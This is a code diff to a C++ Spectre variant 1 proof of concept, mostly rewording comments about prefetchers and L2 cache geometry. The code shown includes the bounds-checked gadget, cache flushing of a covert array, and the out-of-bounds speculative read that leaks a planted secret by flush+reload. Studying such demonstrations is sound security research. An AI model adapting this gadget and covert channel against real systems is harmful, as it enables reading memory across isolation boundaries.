@@ -9,11 +9,11 @@ using u8 = unsigned char;
 using u32 = unsigned int;
 using u64 = unsigned long long;
 
-// Every data structure touched in the critical path is page aligned to thwart prefetchers.
-// This is slightly problematic because 4096 aligned accesses are all going to target
-// the same set in L1, so if the secret happens to be more than 8b in an 8-way/32-KiB
-// L1D, then we'd lose some characters. But here we're banking on L2 misses rather than
-// L1. On Skylake-X, the L2 cache is 16-way associative, 1 MiB in size. The critical
+// Every data structure touched in the critical path is page aligned to thwart some types
+// of prefetchers. This is slightly problematic because 4096 aligned accesses are all going
+// to target the same set in L1, so if the secret happens to be more than 8b in an 8-way,
+// 32-KiB L1D, then we'd lose some characters. But here we're banking on L2 misses rather
+// than L1. On Skylake-X, the L2 cache is 16-way associative, 1 MiB in size. The critical
 // stride works out to be (1024 KiB << 10) / 16 = 65,536 bytes. We'd select the same L2
 // set when accesses are 65,536 bytes apart.
 #define PAGE_SZ 0x1000
@@ -27,23 +27,22 @@ alignas(PAGE_SZ) const char* secret_space = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_";
 int secret_space_length = 0;
 
 #define ACCESS_BOUND 4
-alignas(PAGE_SZ) struct SecretStruct {
+alignas(PAGE_SZ) struct {
     u8 values[ACCESS_BOUND] = {1, 2, 3, 4};     // `get_value` doesn't guard this.
     char secret[128] = "PWND_SECRET";           // `get_value` does (well, should!) guard this.
-
-    // Bound checks must retrieve the bound from memory for flush-reload to work.
-    volatile u8 NVALUES = ACCESS_BOUND;
+    volatile u32 NVALUES = ACCESS_BOUND;        // Bound checks must retrieve the bound from memory.
 } DATA;
 
 [[gnu::noinline]] u8 get_value(int idx, u8* covert) {
     if (idx < DATA.NVALUES) {
-        // Every PAGE_SZ * DATA.values[idx] maps to a unique page in `covert`.
-        // Stream prefetchers don't cross page boundaries, so we are guaranteed
-        // that accessing PAGE_SZ * 'B' won't accidentally prefetch PAGE_SZ * 'C'.
-        // Accesses PAGE_SZ * ord('A'..'Z') touch memory in the range (base + 266'240)
-        // to (base + 368'640) where 'base' is the base address of `covert`. This is
-        // fine because `covert` spans over 256 distinct pages: from (base + 0) to
-        // (base + 1'048'576). Size of `covert` also covers '_' if key includes it.
+        // Every PAGE_SZ * DATA.values[idx] maps to a unique page in `covert`. Many
+        // prefetchers don't cross page boundaries (can't say that about stream or page
+        // prefetchers, though), so we are hopeful that accessing PAGE_SZ * 'B' won't
+        // accidentally prefetch PAGE_SZ * 'C'. Accesses PAGE_SZ * ord('A'..'Z') touch
+        // memory in the range (base + 266'240) to (base + 368'640) where 'base' is the
+        // base address of `covert`. This is fine because `covert` spans over 256 distinct
+        // pages: from (base + 0) to (base + 1'048'576). Size of `covert` also covers '_'
+        // if key includes it.
         return covert[PAGE_SZ * (DATA.values[idx])];
     }
     return 0;
@@ -76,8 +75,8 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
             _mm_clflush(&covert[PAGE_SZ * (u8)secret_space[i]]);
         }
 
-        // Malign access. `byte_idx` > 4 is out of bounds. The misprediction speculatively
-        // reads `DATA.secret` through the covert channel.
+        // Malicious access. `byte_idx` > 4 is out of bounds. The misprediction
+        // speculatively reads `DATA.secret` through the covert channel.
         _mm_lfence();
         sum += get_value(byte_idx, covert);
 
